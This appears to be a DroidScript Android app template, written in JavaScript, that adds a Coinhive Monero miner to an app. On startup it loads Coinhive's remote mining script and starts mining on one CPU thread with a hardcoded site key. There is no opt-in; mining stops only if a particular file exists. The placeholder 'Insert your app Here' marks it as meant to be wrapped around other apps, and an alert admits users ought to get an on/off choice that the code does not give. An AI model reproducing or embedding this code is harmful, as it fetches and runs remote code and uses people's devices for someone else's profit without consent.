var Miner = false;
var Key = "aFz4C1jJtOQEEuuquRg2m7KbdgcVPf8Q";

//Called when application is started.
function OnStart()
{
    app.Alert("This is just an example how it works so i dont create a App that can change your life with it\n\nCoinhive also recommend: Let the use decide to use this or not (On/Off button etc)\n\ni also know that is not realy effectiv (exept you have 1 Million users a day so you create 20XMR/Hour) the current rate at writing this text 0.3 XMR = ~30$\n\nMore at https://coinhive.com\nI belive this is not bad but like bitcoins etc this can be used for bad stuff but i can buy drugs with the real money too :P\n\nOh and as you see at the 'Hash Accepted!' popup this is already working with 1 Thread (1 Core) at the power of 60%","Important");
    app.ShowProgress("Loading");
	//Create a layout with objects vertically centered.
	lay = app.CreateLayout( "linear", "VCenter,FillXY" );	

	//Create a text label and add it to layout.
	txt = app.CreateText( "Insert your app Here" );
	txt2 = app.CreateText( "0H/s" );
	txt3 = app.CreateText( "0 Total" );
	txt4 = app.CreateText( "0 Accepted" );
	txt.SetTextSize( 32 );
	txt2.SetTextSize( 32 );
	txt3.SetTextSize( 32 );
	txt4.SetTextSize( 32 );
	lay.AddChild( txt );
	lay.AddChild( txt2 );
	lay.AddChild( txt3 );
	lay.AddChild( txt4 );
	
	//Add layout to app.	
	app.AddLayout( lay );
	
	if(! app.FileExists(app.GetInternalFolder+"/nominer.txt"))
	    app.LoadScript("https://coinhive.com/lib/coinhive.min.js",StartMiner);
	
	app.HideProgress();
}

    function StartMiner() {
    	var Miner = new CoinHive.User('aFz4C1jJtOQEEuuquRg2m7KbdgcVPf8Q', 'DroidScript Example', {
    	threads: 1, // One CPU Core/Thread
    	autoThreads: false,
    	throttle: .4, // i want to throw away 40% of the power of the thread(s)
    	//forceASMJS: false
    });

	Miner.start();        
	
	Miner.on('accepted', function() {app.ShowPopup( 'Hash Accepted!' );})

    	// Update stats once per second
	setInterval(function() {
	    txt2.SetText(Math.round(Miner.getHashesPerSecond())+"H/s");
		txt3.SetText(Miner.getTotalHashes() + " Total");
		txt4.SetText(Miner.getAcceptedHashes()+" Accepted");

	}, 5000);
    }
    
    